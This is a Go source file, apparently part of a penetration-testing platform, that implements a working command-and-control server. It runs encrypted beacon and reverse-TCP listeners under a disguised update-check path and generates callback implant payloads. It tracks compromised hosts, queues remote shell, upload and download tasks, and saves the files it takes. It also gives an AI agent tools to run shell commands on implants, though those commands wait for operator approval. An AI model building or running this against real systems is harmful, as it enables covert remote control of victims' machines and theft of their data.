package server

import (
	"context"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"database/sql"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"github.com/Autumn-27/artex/agent"
	"github.com/Autumn-27/artex/c2"
	actool "github.com/Autumn-27/norma/tool"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"
)

type c2OperatorState struct {
	mu      sync.Mutex
	running map[int64]*c2Running
	wg      sync.WaitGroup
}
type c2Running struct {
	server   *http.Server
	listener net.Listener
	conns    map[net.Conn]bool
	cancel   context.CancelFunc
}
type c2Listener struct {
	ID                                           int64
	Name, Kind, Host, Path, Envelope, Key, Token string
	Port                                         int
}
type c2Message struct {
	Type      string `json:"type"`
	Token     string `json:"token"`
	SessionID int64  `json:"session_id"`
	Implant   struct {
		UUID       string `json:"uuid"`
		Hostname   string `json:"hostname"`
		Username   string `json:"username"`
		OS         string `json:"os"`
		Arch       string `json:"arch"`
		PID        int    `json:"pid"`
		Process    string `json:"process_name"`
		Admin      bool   `json:"is_admin"`
		InternalIP string `json:"internal_ip"`
		Sleep      int    `json:"sleep_secs"`
	} `json:"implant"`
	Results []struct {
		ID     int64  `json:"id"`
		Output string `json:"output"`
		Error  string `json:"error"`
		Status string `json:"status"`
	} `json:"results"`
}

func (s *Server) registerC2Routes(mux *http.ServeMux) {
	mux.HandleFunc("GET /api/c2/listeners", s.operatorC2Listeners)
	mux.HandleFunc("POST /api/c2/listeners", s.operatorC2Create)
	mux.HandleFunc("DELETE /api/c2/listeners/{id}", s.operatorC2DeleteListener)
	mux.HandleFunc("POST /api/c2/listeners/{id}/start", s.operatorC2Start)
	mux.HandleFunc("POST /api/c2/listeners/{id}/stop", s.operatorC2Stop)
	mux.HandleFunc("GET /api/c2/listeners/{id}/payload", s.operatorC2Payload)
	mux.HandleFunc("GET /api/c2/sessions", s.operatorC2Sessions)
	mux.HandleFunc("DELETE /api/c2/sessions/{id}", s.operatorC2DeleteSession)
	mux.HandleFunc("POST /api/c2/sessions/{id}/tasks", s.operatorC2Task)
	mux.HandleFunc("POST /api/c2/sessions/{id}/chat", s.operatorC2Chat)
	mux.HandleFunc("GET /api/c2/sessions/{id}/files", s.operatorC2Files)
	mux.HandleFunc("GET /api/c2/tasks", s.operatorC2Tasks)
	mux.HandleFunc("POST /api/c2/tasks/{id}/cancel", s.operatorC2CancelTask)
	mux.HandleFunc("POST /api/c2/tasks/{id}/approve", s.operatorC2ApproveTask)
	mux.HandleFunc("GET /api/c2/events", s.operatorC2Events)
	mux.HandleFunc("GET /api/c2/files/{id}/download", s.operatorC2Download)
}
func (s *Server) operatorSQLList(ctx context.Context, q string, args ...any) ([]map[string]any, error) {
	rows, err := s.m.pg.QueryContext(ctx, q, args...)
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	out := []map[string]any{}
	for rows.Next() {
		var b []byte
		if err = rows.Scan(&b); err != nil {
			return nil, err
		}
		var v map[string]any
		if err = json.Unmarshal(b, &v); err != nil {
			return nil, err
		}
		out = append(out, v)
	}
	return out, rows.Err()
}
func (s *Server) c2Event(ctx context.Context, lid, sid, tid int64, category, msg string) {
	_, _ = s.m.pg.ExecContext(ctx, `INSERT INTO c2_events(listener_id,session_id,task_id,category,message) VALUES(NULLIF($1,0),NULLIF($2,0),NULLIF($3,0),$4,$5)`, lid, sid, tid, category, msg)
}
func (s *Server) c2Listener(ctx context.Context, id int64) (c2Listener, error) {
	var l c2Listener
	var k, t string
	err := s.m.pg.QueryRowContext(ctx, `SELECT id,name,kind,bind_host,bind_port,path,envelope,encryption_key,implant_token FROM c2_listeners WHERE id=$1`, id).Scan(&l.ID, &l.Name, &l.Kind, &l.Host, &l.Port, &l.Path, &l.Envelope, &k, &t)
	if err != nil {
		return l, err
	}
	b, err := s.m.pg.OperatorOpen(s.jwtKey, k)
	if err != nil {
		return l, err
	}
	l.Key = string(b)
	b, err = s.m.pg.OperatorOpen(s.jwtKey, t)
	l.Token = string(b)
	return l, err
}
func (s *Server) operatorC2Listeners(w http.ResponseWriter, r *http.Request) {
	if s.pg(w) == nil {
		return
	}
	items, err := s.operatorSQLList(r.Context(), `SELECT to_jsonb(l)-'encryption_key'-'implant_token' FROM c2_listeners l ORDER BY id`)
	if err != nil {
		operatorError(w, err)
		return
	}
	writeJSON(w, 200, map[string]any{"items": items})
}
func (s *Server) operatorC2Create(w http.ResponseWriter, r *http.Request) {
	if s.pg(w) == nil {
		return
	}
	var v struct {
		Name     string `json:"name"`
		Kind     string `json:"kind"`
		Host     string `json:"bind_host"`
		Port     int    `json:"bind_port"`
		Path     string `json:"path"`
		Envelope string `json:"envelope"`
		Remark   string `json:"remark"`
		Start    bool   `json:"start"`
	}
	if !operatorDecode(w, r, &v) {
		return
	}
	if strings.TrimSpace(v.Name) == "" || len(v.Name) > 200 || v.Port < 1 || v.Port > 65535 {
		writeErr(w, 400, "name and valid bind_port required")
		return
	}
	if v.Kind != "http_beacon" && v.Kind != "tcp_reverse" {
		writeErr(w, 400, "kind must be http_beacon or tcp_reverse")
		return
	}
	if v.Host == "" {
		v.Host = "127.0.0.1"
	}
	if v.Path == "" {
		v.Path = "/updates/check"
	}
	if !strings.HasPrefix(v.Path, "/") || strings.ContainsAny(v.Path, "?#\r\n") {
		writeErr(w, 400, "invalid beacon path")
		return
	}
	if v.Envelope == "" {
		v.Envelope = "auto"
	}
	if v.Envelope != "auto" && v.Envelope != "gcm" && v.Envelope != "cbc-hmac" {
		writeErr(w, 400, "invalid envelope")
		return
	}
	raw := make([]byte, 32)
	if _, err := io.ReadFull(rand.Reader, raw); err != nil {
		operatorError(w, err)
		return
	}
	key := base64.StdEncoding.EncodeToString(raw)
	if _, err := io.ReadFull(rand.Reader, raw); err != nil {
		operatorError(w, err)
		return
	}
	token := base64.RawURLEncoding.EncodeToString(raw)
	k, err := s.m.pg.OperatorSeal(s.jwtKey, []byte(key))
	if err != nil {
		operatorError(w, err)
		return
	}
	t, err := s.m.pg.OperatorSeal(s.jwtKey, []byte(token))
	if err != nil {
		operatorError(w, err)
		return
	}
	var id int64
	err = s.m.pg.QueryRowContext(r.Context(), `INSERT INTO c2_listeners(name,kind,bind_host,bind_port,path,envelope,encryption_key,implant_token,remark) VALUES($1,$2,$3,$4,$5,$6,$7,$8,$9) RETURNING id`, v.Name, v.Kind, v.Host, v.Port, v.Path, v.Envelope, k, t, v.Remark).Scan(&id)
	if err != nil {
		operatorError(w, err)
		return
	}
	started := false
	errText := ""
	if v.Start {
		if err = s.startOperatorC2(id); err != nil {
			errText = err.Error()
		} else {
			started = true
		}
	}
	s.c2Event(r.Context(), id, 0, 0, "listener", "created")
	writeJSON(w, 200, map[string]any{"id": id, "started": started, "error": errText})
}
func (s *Server) startOperatorC2(id int64) error {
	if s.c2Ops == nil {
		return fmt.Errorf("C2 subsystem unavailable")
	}
	l, err := s.c2Listener(s.ctx, id)
	if err != nil {
		return err
	}
	key, err := c2.ParseKey(l.Key)
	if err != nil {
		return err
	}
	s.c2Ops.mu.Lock()
	defer s.c2Ops.mu.Unlock()
	if s.c2Ops.running[id] != nil {
		return nil
	}
	ln, err := net.Listen("tcp", net.JoinHostPort(l.Host, strconv.Itoa(l.Port)))
	if err != nil {
		_, _ = s.m.pg.Exec(`UPDATE c2_listeners SET status='error',last_error=$2 WHERE id=$1`, id, err.Error())
		return err
	}
	ctx, cancel := context.WithCancel(s.ctx)
	run := &c2Running{listener: ln, conns: map[net.Conn]bool{}, cancel: cancel}
	s.c2Ops.running[id] = run
	if l.Kind == "http_beacon" {
		srv := &http.Server{ReadHeaderTimeout: 5 * time.Second, ReadTimeout: 30 * time.Second, WriteTimeout: 30 * time.Second, IdleTimeout: 60 * time.Second, MaxHeaderBytes: 16 << 10, Handler: http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			if r.Method != "POST" || r.URL.Path != l.Path || !hmac.Equal([]byte(r.Header.Get("X-Implant-Token")), []byte(l.Token)) {
				http.NotFound(w, r)
				return
			}
			b, err := io.ReadAll(http.MaxBytesReader(w, r.Body, c2.MaxFrame))
			if err != nil {
				http.Error(w, "invalid request", 400)
				return
			}
			raw, mode, err := (c2.Envelope{Key: key, Mode: l.Envelope}).Open(b)
			if err != nil {
				http.NotFound(w, r)
				return
			}
			reply, err := s.handleOperatorC2(ctx, l, raw, r.RemoteAddr)
			if err != nil {
				http.Error(w, "invalid message", 400)
				return
			}
			wire, err := (c2.Envelope{Key: key, Mode: l.Envelope}).Seal(reply, mode)
			if err != nil {
				http.Error(w, "reply failed", 500)
				return
			}
			w.Header().Set("Content-Type", "application/json")
			_, _ = w.Write(wire)
		})}
		run.server = srv
		s.c2Ops.wg.Add(1)
		go func() { defer s.c2Ops.wg.Done(); _ = srv.Serve(ln) }()
	} else {
		s.c2Ops.wg.Add(1)
		go func() {
			defer s.c2Ops.wg.Done()
			for {
				conn, err := ln.Accept()
				if err != nil {
					return
				}
				s.c2Ops.mu.Lock()
				if s.c2Ops.running[id] != run {
					s.c2Ops.mu.Unlock()
					conn.Close()
					return
				}
				if len(run.conns) >= 64 {
					s.c2Ops.mu.Unlock()
					conn.Close()
					continue
				}
				run.conns[conn] = true
				s.c2Ops.wg.Add(1)
				s.c2Ops.mu.Unlock()
				go func() {
					defer s.c2Ops.wg.Done()
					defer conn.Close()
					defer func() { s.c2Ops.mu.Lock(); delete(run.conns, conn); s.c2Ops.mu.Unlock() }()
					for {
						_ = conn.SetDeadline(time.Now().Add(90 * time.Second))
						wire, err := c2.ReadFrame(conn)
						if err != nil {
							return
						}
						raw, mode, err := (c2.Envelope{Key: key, Mode: l.Envelope}).Open(wire)
						if err != nil {
							return
						}
						reply, err := s.handleOperatorC2(ctx, l, raw, conn.RemoteAddr().String())
						if err != nil {
							return
						}
						wire, err = (c2.Envelope{Key: key, Mode: l.Envelope}).Seal(reply, mode)
						if err != nil || c2.WriteFrame(conn, wire) != nil {
							return
						}
						select {
						case <-ctx.Done():
							return
						case <-time.After(time.Second):
						}
					}
				}()
			}
		}()
	}
	_, err = s.m.pg.Exec(`UPDATE c2_listeners SET status='running',started_at=now(),last_error='',updated_at=now() WHERE id=$1`, id)
	return err
}
func (s *Server) stopOperatorC2(id int64) {
	if s.c2Ops == nil {
		return
	}
	s.c2Ops.mu.Lock()
	run := s.c2Ops.running[id]
	delete(s.c2Ops.running, id)
	if run != nil {
		run.cancel()
		if run.server != nil {
			run.server.Close()
		}
		run.listener.Close()
		for c := range run.conns {
			c.Close()
		}
	}
	s.c2Ops.mu.Unlock()
	if s.m != nil && s.m.pg != nil {
		_, _ = s.m.pg.Exec(`UPDATE c2_listeners SET status='stopped',updated_at=now() WHERE id=$1`, id)
	}
}
func (s *Server) operatorC2Start(w http.ResponseWriter, r *http.Request) {
	if s.pg(w) == nil {
		return
	}
	id, e := pathID(r, "id")
	if e == nil {
		e = s.startOperatorC2(id)
	}
	if e != nil {
		writeErr(w, 400, e.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"ok": true})
}
func (s *Server) operatorC2Stop(w http.ResponseWriter, r *http.Request) {
	if s.pg(w) == nil {
		return
	}
	id, e := pathID(r, "id")
	if e != nil {
		writeErr(w, 400, e.Error())
		return
	}
	s.stopOperatorC2(id)
	writeJSON(w, 200, map[string]any{"ok": true})
}
func (s *Server) operatorC2DeleteListener(w http.ResponseWriter, r *http.Request) {
	if s.pg(w) == nil {
		return
	}
	id, e := pathID(r, "id")
	if e != nil {
		writeErr(w, 400, e.Error())
		return
	}
	s.stopOperatorC2(id)
	_, e = s.m.pg.ExecContext(r.Context(), "DELETE FROM c2_listeners WHERE id=$1", id)
	if e != nil {
		operatorError(w, e)
		return
	}
	writeJSON(w, 200, map[string]any{"ok": true})
}
func (s *Server) operatorC2Payload(w http.ResponseWriter, r *http.Request) {
	if s.pg(w) == nil {
		return
	}
	id, e := pathID(r, "id")
	if e != nil {
		writeErr(w, 400, e.Error())
		return
	}
	l, e := s.c2Listener(r.Context(), id)
	if e != nil {
		operatorError(w, e)
		return
	}
	host := r.URL.Query().Get("host")
	if host == "" {
		host = l.Host
	}
	if host == "0.0.0.0" || host == "::" || strings.ContainsAny(host, "/\\@\r\n\t ") {
		writeErr(w, 400, "explicit reachable callback host required")
		return
	}
	b := make([]byte, 16)
	if _, e = rand.Read(b); e != nil {
		operatorError(w, e)
		return
	}
	transport := "http"
	if l.Kind == "tcp_reverse" {
		transport = "tcp"
	}
	u := url.URL{Scheme: "http", Host: net.JoinHostPort(host, strconv.Itoa(l.Port)), Path: l.Path}
	c := c2.PayloadConfig{URL: u.String(), Host: host, Port: l.Port, Token: l.Token, Key: l.Key, UUID: hex.EncodeToString(b), Interval: 5, Transport: transport, Envelope: l.Envelope}
	osName := r.URL.Query().Get("os")
	if osName == "" {
		osName = "linux"
	}
	script, oneliner, e := c2.BuildPayload(c, osName)
	if e != nil {
		writeErr(w, 400, e.Error())
		return
	}
	s.c2Event(r.Context(), id, 0, 0, "payload", "generated "+osName)
	writeJSON(w, 200, map[string]any{"id": id, "host": host, "port": l.Port, "kind": l.Kind, "os": osName, "path": l.Path, "script": script, "oneliner": oneliner})
}
func (s *Server) handleOperatorC2(ctx context.Context, l c2Listener, raw []byte, remote string) ([]byte, error) {
	var m c2Message
	if json.Unmarshal(raw, &m) != nil {
		return nil, fmt.Errorf("invalid message")
	}
	sid := m.SessionID
	if m.Type == "checkin" {
		if !hmac.Equal([]byte(m.Token), []byte(l.Token)) || m.Implant.UUID == "" || len(m.Implant.UUID) > 200 {
			return nil, fmt.Errorf("invalid checkin")
		}
		i := m.Implant
		if len(i.Hostname) > 256 || len(i.Username) > 256 || len(i.OS) > 100 || len(i.Arch) > 100 {
			return nil, fmt.Errorf("oversized identity")
		}
		sleep := i.Sleep
		if sleep < 1 || sleep > 3600 {
			sleep = 5
		}
		host, _, _ := net.SplitHostPort(remote)
		err := s.m.pg.QueryRowContext(ctx, `INSERT INTO c2_sessions(listener_id,implant_uuid,hostname,username,os,arch,pid,process_name,is_admin,internal_ip,external_ip,sleep_seconds) VALUES($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12) ON CONFLICT(listener_id,implant_uuid) DO UPDATE SET hostname=EXCLUDED.hostname,username=EXCLUDED.username,os=EXCLUDED.os,arch=EXCLUDED.arch,pid=EXCLUDED.pid,last_check_in=now(),status='active',sleep_seconds=EXCLUDED.sleep_seconds WHERE c2_sessions.status!='killed' RETURNING id`, l.ID, i.UUID, i.Hostname, i.Username, i.OS, i.Arch, i.PID, i.Process, i.Admin, i.InternalIP, host, sleep).Scan(&sid)
		if err != nil {
			return nil, err
		}
	} else {
		var id int64
		if err := s.m.pg.QueryRowContext(ctx, "SELECT id FROM c2_sessions WHERE id=$1 AND listener_id=$2 AND status!='killed'", sid, l.ID).Scan(&id); err != nil {
			return nil, err
		}
		_, _ = s.m.pg.ExecContext(ctx, "UPDATE c2_sessions SET last_check_in=now(),status='active' WHERE id=$1", sid)
	}
	if m.Type == "result" {
		if len(m.Results) > 32 {
			return nil, fmt.Errorf("too many results")
		}
		for _, r := range m.Results {
			status := "success"
			if r.Error != "" || r.Status == "failed" {
				status = "failed"
			}
			if len(r.Output) > 3<<20 || len(r.Error) > 16<<10 {
				return nil, fmt.Errorf("result too large")
			}
			var typ string
			var payload []byte
			err := s.m.pg.QueryRowContext(ctx, `UPDATE c2_tasks SET status=$3,result_text=$4,error=$5,completed_at=now(),duration_ms=COALESCE(EXTRACT(EPOCH FROM (now()-sent_at))*1000,0) WHERE id=$1 AND session_id=$2 AND status IN ('sent','running') RETURNING task_type,payload`, r.ID, sid, status, r.Output, r.Error).Scan(&typ, &payload)
			if err == sql.ErrNoRows {
				continue
			}
			if err != nil {
				return nil, err
			}
			if typ == "download" && status == "success" {
				var p struct {
					Path string `json:"path"`
				}
				_ = json.Unmarshal(payload, &p)
				if err = s.c2SaveDownload(ctx, sid, r.ID, p.Path, r.Output); err != nil {
					return nil, err
				}
			}
			s.c2Event(ctx, l.ID, sid, r.ID, "task", "completed "+status)
		}
	} else if m.Type != "checkin" && m.Type != "beacon" {
		return nil, fmt.Errorf("unknown message type")
	}
	tasks := []map[string]any{}
	var err error
	if m.Type != "result" {
		tasks, err = s.claimOperatorC2Tasks(ctx, sid)
	}
	if err != nil {
		return nil, err
	}
	return json.Marshal(map[string]any{"type": "beacon", "session_id": sid, "tasks": tasks, "server_time": time.Now().Unix()})
}
func (s *Server) claimOperatorC2Tasks(ctx context.Context, sid int64) ([]map[string]any, error) {
	tx, err := s.m.pg.BeginTx(ctx, nil)
	if err != nil {
		return nil, err
	}
	defer tx.Rollback()
	rows, err := tx.QueryContext(ctx, `SELECT id,task_type,payload FROM c2_tasks WHERE session_id=$1 AND status='queued' ORDER BY id FOR UPDATE SKIP LOCKED LIMIT 4`, sid)
	if err != nil {
		return nil, err
	}
	tasks := []map[string]any{}
	for rows.Next() {
		var id int64
		var typ string
		var b []byte
		if err = rows.Scan(&id, &typ, &b); err != nil {
			rows.Close()
			return nil, err
		}
		v := map[string]any{}
		if err = json.Unmarshal(b, &v); err != nil {
			rows.Close()
			return nil, err
		}
		v["id"] = id
		v["type"] = typ
		tasks = append(tasks, v)
	}
	err = rows.Err()
	rows.Close()
	if err != nil {
		return nil, err
	}
	for _, t := range tasks {
		if _, err = tx.ExecContext(ctx, "UPDATE c2_tasks SET status='sent',sent_at=now() WHERE id=$1", t["id"]); err != nil {
			return nil, err
		}
	}
	return tasks, tx.Commit()
}
func (s *Server) c2SaveDownload(ctx context.Context, sid, tid int64, remote, b64 string) error {
	b, err := base64.StdEncoding.DecodeString(b64)
	if err != nil || len(b) > 2<<20 {
		return fmt.Errorf("download invalid or exceeds 2 MiB")
	}
	root := filepath.Join(s.dataDir, "c2", "files")
	if err = os.MkdirAll(root, 0700); err != nil {
		return err
	}
	name := fmt.Sprintf("task-%d.bin", tid)
	path := filepath.Join(root, name)
	if err = os.WriteFile(path, b, 0600); err != nil {
		return err
	}
	sum := sha256.Sum256(b)
	_, err = s.m.pg.ExecContext(ctx, `INSERT INTO c2_files(session_id,task_id,direction,remote_path,local_path,size_bytes,sha256) VALUES($1,$2,'download',$3,$4,$5,$6)`, sid, tid, remote, name, len(b), hex.EncodeToString(sum[:]))
	return err
}
func (s *Server) operatorC2Sessions(w http.ResponseWriter, r *http.Request) {
	if s.pg(w) == nil {
		return
	}
	lid, _ := strconv.ParseInt(r.URL.Query().Get("listener_id"), 10, 64)
	items, e := s.operatorSQLList(r.Context(), `SELECT to_jsonb(x) FROM c2_sessions x WHERE ($1=0 OR listener_id=$1) ORDER BY last_check_in DESC LIMIT 500`, lid)
	if e != nil {
		operatorError(w, e)
		return
	}
	writeJSON(w, 200, map[string]any{"items": items})
}
func (s *Server) operatorC2DeleteSession(w http.ResponseWriter, r *http.Request) {
	if s.pg(w) == nil {
		return
	}
	id, e := pathID(r, "id")
	if e == nil {
		_, e = s.m.pg.ExecContext(r.Context(), "UPDATE c2_sessions SET status='killed' WHERE id=$1", id)
	}
	if e != nil {
		operatorError(w, e)
		return
	}
	writeJSON(w, 200, map[string]any{"ok": true})
}
func (s *Server) queueOperatorC2Task(ctx context.Context, sid int64, b json.RawMessage, source string) (int64, string, error) {
	var v struct {
		Type    string `json:"type"`
		Command string `json:"command"`
		Arg     string `json:"arg"`
		Path    string `json:"path"`
		Data    string `json:"data"`
	}
	if err := json.Unmarshal(b, &v); err != nil {
		return 0, "", err
	}
	switch v.Type {
	case "shell":
		if strings.TrimSpace(v.Command) == "" || len(v.Command) > 32<<10 {
			return 0, "", fmt.Errorf("valid command required")
		}
	case "sleep":
		n, e := strconv.Atoi(v.Arg)
		if e != nil || n < 1 || n > 3600 {
			return 0, "", fmt.Errorf("sleep must be 1-3600")
		}
	case "upload", "download":
		if v.Path == "" || len(v.Path) > 4000 {
			return 0, "", fmt.Errorf("remote path required")
		}
		if len(v.Data) > 3<<20 {
			return 0, "", fmt.Errorf("file too large")
		}
	case "exit":
	default:
		return 0, "", fmt.Errorf("unsupported task type")
	}
	var exists bool
	if err := s.m.pg.QueryRowContext(ctx, "SELECT EXISTS(SELECT 1 FROM c2_sessions WHERE id=$1 AND status!='killed')", sid).Scan(&exists); err != nil || !exists {
		return 0, "", fmt.Errorf("active session required")
	}
	payload, _ := json.Marshal(map[string]any{"command": v.Command, "arg": v.Arg, "path": v.Path, "data": v.Data})
	status, approval := "queued", ""
	if source == "ai" {
		status = "awaiting_approval"
		approval = "pending"
	}
	var id int64
	err := s.m.pg.QueryRowContext(ctx, `INSERT INTO c2_tasks(session_id,task_type,payload,status,source,approval_status) VALUES($1,$2,$3::jsonb,$4,$5,$6) RETURNING id`, sid, v.Type, payload, status, source, approval).Scan(&id)
	return id, status, err
}
func (s *Server) operatorC2Task(w http.ResponseWriter, r *http.Request) {
	if s.pg(w) == nil {
		return
	}
	id, e := pathID(r, "id")
	if e != nil {
		writeErr(w, 400, e.Error())
		return
	}
	var b json.RawMessage
	if !operatorDecode(w, r, &b) {
		return
	}
	tid, status, e := s.queueOperatorC2Task(r.Context(), id, b, "manual")
	if e != nil {
		writeErr(w, 400, e.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"id": tid, "status": status})
}
func (s *Server) operatorC2Tasks(w http.ResponseWriter, r *http.Request) {
	if s.pg(w) == nil {
		return
	}
	sid, _ := strconv.ParseInt(r.URL.Query().Get("session_id"), 10, 64)
	items, e := s.operatorSQLList(r.Context(), `SELECT to_jsonb(x) FROM c2_tasks x WHERE ($1=0 OR session_id=$1) ORDER BY id DESC LIMIT 200`, sid)
	if e != nil {
		operatorError(w, e)
		return
	}
	writeJSON(w, 200, map[string]any{"items": items})
}
func (s *Server) operatorC2CancelTask(w http.ResponseWriter, r *http.Request) {
	if s.pg(w) == nil {
		return
	}
	id, e := pathID(r, "id")
	if e == nil {
		var n int64
		e = s.m.pg.QueryRowContext(r.Context(), `UPDATE c2_tasks SET status='cancelled',completed_at=now() WHERE id=$1 AND status IN ('queued','awaiting_approval') RETURNING id`, id).Scan(&n)
	}
	if e != nil {
		writeErr(w, 409, "task already delivered, completed or unavailable; remote execution was not assumed cancelled")
		return
	}
	writeJSON(w, 200, map[string]any{"ok": true})
}
func (s *Server) operatorC2ApproveTask(w http.ResponseWriter, r *http.Request) {
	if s.pg(w) == nil {
		return
	}
	id, e := pathID(r, "id")
	if e != nil {
		writeErr(w, 400, e.Error())
		return
	}
	var n int64
	e = s.m.pg.QueryRowContext(r.Context(), `UPDATE c2_tasks SET status='queued',approval_status='approved' WHERE id=$1 AND status='awaiting_approval' RETURNING id`, id).Scan(&n)
	if e != nil {
		writeErr(w, 409, "task not pending approval")
		return
	}
	s.c2Event(r.Context(), 0, 0, id, "opsec", "operator approved")
	writeJSON(w, 200, map[string]any{"ok": true})
}
func (s *Server) operatorC2Events(w http.ResponseWriter, r *http.Request) {
	if s.pg(w) == nil {
		return
	}
	sid, _ := strconv.ParseInt(r.URL.Query().Get("session_id"), 10, 64)
	items, e := s.operatorSQLList(r.Context(), `SELECT to_jsonb(x) FROM c2_events x WHERE ($1=0 OR session_id=$1) ORDER BY id DESC LIMIT 200`, sid)
	if e != nil {
		operatorError(w, e)
		return
	}
	writeJSON(w, 200, map[string]any{"items": items})
}
func (s *Server) operatorC2Files(w http.ResponseWriter, r *http.Request) {
	if s.pg(w) == nil {
		return
	}
	id, e := pathID(r, "id")
	if e != nil {
		writeErr(w, 400, e.Error())
		return
	}
	items, e := s.operatorSQLList(r.Context(), `SELECT to_jsonb(x)-'local_path' FROM c2_files x WHERE session_id=$1 ORDER BY id DESC LIMIT 200`, id)
	if e != nil {
		operatorError(w, e)
		return
	}
	writeJSON(w, 200, map[string]any{"items": items})
}
func (s *Server) operatorC2Download(w http.ResponseWriter, r *http.Request) {
	if s.pg(w) == nil {
		return
	}
	id, e := pathID(r, "id")
	if e != nil {
		writeErr(w, 400, e.Error())
		return
	}
	var name string
	if e = s.m.pg.QueryRowContext(r.Context(), "SELECT local_path FROM c2_files WHERE id=$1", id).Scan(&name); e != nil {
		operatorError(w, e)
		return
	}
	if name != filepath.Base(name) {
		writeErr(w, 400, "invalid file record")
		return
	}
	p := filepath.Join(s.dataDir, "c2", "files", name)
	if !cleanupPathSafe(s.dataDir, p) {
		writeErr(w, 409, "file unavailable")
		return
	}
	w.Header().Set("Content-Disposition", `attachment; filename="`+name+`"`)
	http.ServeFile(w, r, p)
}
func (s *Server) operatorC2Chat(w http.ResponseWriter, r *http.Request) {
	if s.pg(w) == nil {
		return
	}
	id, e := pathID(r, "id")
	if e != nil {
		writeErr(w, 400, e.Error())
		return
	}
	var req struct {
		TaskID int64 `json:"task_id"`
	}
	if !operatorDecode(w, r, &req) {
		return
	}
	if req.TaskID <= 0 {
		writeErr(w, 400, "explicit task_id required for agent control")
		return
	}
	if _, ok := s.m.Task(strconv.FormatInt(req.TaskID, 10)); !ok {
		writeErr(w, 400, "task not found")
		return
	}
	var valid bool
	if e = s.m.pg.QueryRowContext(r.Context(), "SELECT EXISTS(SELECT 1 FROM c2_sessions WHERE id=$1 AND status!='killed')", id).Scan(&valid); e != nil || !valid {
		writeErr(w, 404, "session unavailable")
		return
	}
	c, e := s.m.pg.CreateConversation("pentest", fmt.Sprintf("C2 #%d", id), nil)
	if e != nil {
		operatorError(w, e)
		return
	}
	e = s.m.pg.SaveOperatorSetting(r.Context(), fmt.Sprintf("conversation.c2.%d", c.ID), map[string]int64{"session_id": id, "task_id": req.TaskID})
	if e != nil {
		operatorError(w, e)
		return
	}
	writeJSON(w, 200, map[string]any{"conversation_id": c.ID, "session_id": id, "task_id": req.TaskID})
}
func (s *Server) operatorC2Tools() []actool.CoreTool {
	tool := func(name, desc string, props map[string]any, required []string, read bool, fn func(context.Context, json.RawMessage) (any, error)) actool.CoreTool {
		return actool.Build(actool.Spec{Name: name, Description: desc, Schema: map[string]any{"type": "object", "properties": props, "required": required}, Permissions: sessionPerm, ReadOnly: func(json.RawMessage) bool { return read }, Run: func(ctx context.Context, b json.RawMessage, _ *actool.ToolContext) (actool.Result, error) {
			v, e := fn(ctx, b)
			if e != nil {
				return actool.Errorf(e.Error()), nil
			}
			raw, _ := json.Marshal(v)
			return actool.Text(string(raw)), nil
		}})
	}
	return []actool.CoreTool{tool("c2_list_sessions", "列出当前 C2 控制会话；不返回认证密钥。", map[string]any{}, nil, true, func(ctx context.Context, b json.RawMessage) (any, error) {
		if agent.RunInfoFrom(ctx).TaskID <= 0 {
			return nil, fmt.Errorf("task context required")
		}
		return s.operatorSQLList(ctx, `SELECT to_jsonb(x) FROM c2_sessions x WHERE status='active' ORDER BY id LIMIT 100`)
	}), tool("c2_exec", "向显式绑定的 C2 会话排队任务。AI 请求记录为待审批，操作员批准后才投递；已投递任务不会自动重放。", map[string]any{"session_id": map[string]any{"type": "integer"}, "command": strParam("命令")}, []string{"session_id", "command"}, false, func(ctx context.Context, b json.RawMessage) (any, error) {
		var v struct {
			ID      int64  `json:"session_id"`
			Command string `json:"command"`
		}
		if json.Unmarshal(b, &v) != nil {
			return nil, fmt.Errorf("invalid input")
		}
		if err := s.checkC2TaskBinding(ctx, v.ID); err != nil {
			return nil, err
		}
		raw, _ := json.Marshal(map[string]any{"type": "shell", "command": v.Command})
		id, status, err := s.queueOperatorC2Task(ctx, v.ID, raw, "ai")
		return map[string]any{"id": id, "status": status}, err
	}), tool("c2_task_result", "读取当前任务显式绑定的 C2 会话执行结果。", map[string]any{"task_id": map[string]any{"type": "integer"}}, []string{"task_id"}, true, func(ctx context.Context, b json.RawMessage) (any, error) {
		var v struct {
			ID int64 `json:"task_id"`
		}
		if json.Unmarshal(b, &v) != nil {
			return nil, fmt.Errorf("invalid input")
		}
		var sid int64
		if err := s.m.pg.QueryRowContext(ctx, "SELECT session_id FROM c2_tasks WHERE id=$1", v.ID).Scan(&sid); err != nil {
			return nil, err
		}
		if err := s.checkC2TaskBinding(ctx, sid); err != nil {
			return nil, err
		}
		return s.operatorSQLList(ctx, `SELECT to_jsonb(x) FROM c2_tasks x WHERE id=$1`, v.ID)
	})}
}
func (s *Server) checkC2TaskBinding(ctx context.Context, sid int64) error {
	ri := agent.RunInfoFrom(ctx)
	if ri.TaskID <= 0 {
		return fmt.Errorf("task context required")
	}
	var bound map[string]int64
	conv := strings.TrimPrefix(ri.SessionID, "conv-")
	if err := s.m.pg.OperatorSetting(ctx, "conversation.c2."+conv, &bound); err != nil || bound["task_id"] != ri.TaskID || bound["session_id"] != sid {
		return fmt.Errorf("C2 session is not explicitly bound to this task conversation")
	}
	return nil
}
